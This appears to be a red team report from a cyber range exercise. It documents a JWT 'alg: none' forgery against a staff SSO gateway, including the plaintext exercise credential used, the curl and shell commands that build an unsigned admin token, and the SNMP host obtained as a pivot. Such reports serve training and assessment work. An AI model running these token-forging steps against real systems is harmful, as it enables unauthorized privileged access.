# Red Team Engagement Report
**Classification:** RESTRICTED — White Team / Exercise Controller Only
**Report ID:** RED-REPORT-IT01-M03
**Version:** 1.0
**Date:** [Date of Exercise]
**Operator:** [Red Team Operator Name / Handle]
**Range:** RNG-IT-01 · Corporate Gateway
**Machine:** M3 — itgw-sso

---

## 1. Engagement Summary

| Field | Detail |
|---|---|
| Target | PUL Staff Authentication Gateway |
| Target IP | `203.x.x.x` |
| Target Port | `8443` (HTTP) |
| Attack Class | JWT Algorithm Confusion (alg: none) |
| Objective | Forge admin-role JWT; access admin panel; extract SNMP pivot artifact |
| Outcome | **SUCCESSFUL** — Admin portal accessed; SNMP host `203.x.x.x:161` obtained |
| Pivot From | M2 — `svc-deploy-sso:SSO@Prabal!2024` credential |
| Time to Compromise | `[HH:MM]` from M2 completion |

---

## 2. Vulnerability Analysis

The application implements a custom JWT decoder (`decode_jwt_vulnerable`) that reads the `alg` field from the token's own header and conditionally skips signature verification when `alg` equals `none`. This allows an attacker who can observe any valid token structure to forge an arbitrary payload without knowledge of the signing secret.

**CVSS v3.1 Base Score (Operator Assessment):** `9.1 CRITICAL`

---

## 3. Attack Narrative & Timeline

| Step | Time | Action | Outcome |
|---|---|---|---|
| 1 | T+00:00 | Login with `svc-deploy-sso:SSO@Prabal!2024` | Valid HS256 JWT issued, `role: analyst` |
| 2 | T+00:02 | Decode JWT header + payload | Algorithm: HS256, role: analyst confirmed |
| 3 | T+00:04 | Forge header with `alg: none` + payload with `role: admin` | Forged JWT assembled with empty signature |
| 4 | T+00:05 | Submit forged token in `pul_staff_token` cookie | Admin portal rendered |
| 5 | T+00:06 | Read admin infrastructure panel | SNMP host `203.x.x.x:161` documented |

---

## 4. Commands Executed

```bash
# Step 1 — Authenticate
curl -s -c /tmp/sso_cookies.txt -X POST http://203.x.x.x:8443/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=svc-deploy-sso&password=SSO%40Prabal%212024" -L -o /dev/null

TOKEN=$(grep "pul_staff_token" /tmp/sso_cookies.txt | awk '{print $7}')

# Step 2 — Decode JWT
echo $TOKEN | cut -d'.' -f1 | \
  awk '{n=length($0)%4; if(n==2)printf "%s==\n",$0; else if(n==3)printf "%s=\n",$0; else print $0}' | base64 -d
echo $TOKEN | cut -d'.' -f2 | \
  awk '{n=length($0)%4; if(n==2)printf "%s==\n",$0; else if(n==3)printf "%s=\n",$0; else print $0}' | base64 -d

# Step 3 — Forge admin JWT
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"sub":"svc-deploy-sso","role":"admin","iat":1731234567,"exp":9999999999}' \
          | base64 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

# Step 4 — Submit forged token
curl -s -b "pul_staff_token=${FORGED}" http://203.x.x.x:8443/staff-portal | grep -i snmp
```

---

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Forge Web Credentials | T1606 |
| Privilege Escalation | Valid Accounts | T1078 |
| Discovery | System Information Discovery | T1082 |
| Collection | Data from Local System | T1005 |

---

## 6. Pivot Artifact Obtained

| Artifact | Value |
|---|---|
| SNMP Host | `203.x.x.x` |
| SNMP Port | `161` |
| SNMP Version | `v2c` |
| Next Target | M4 — itgw-netmgmt |

---

## 7. Evidence

> **[Attach: curl login — JWT cookie issued]**
> **[Attach: JWT decode output — header + payload]**
> **[Attach: Forged token construction — shell output]**
> **[Attach: Admin portal response with SNMP panel]**

---

**Report Prepared By:** [Red Team Operator]
**White Team Review:** [Exercise Controller]
**Classification:** RESTRICTED
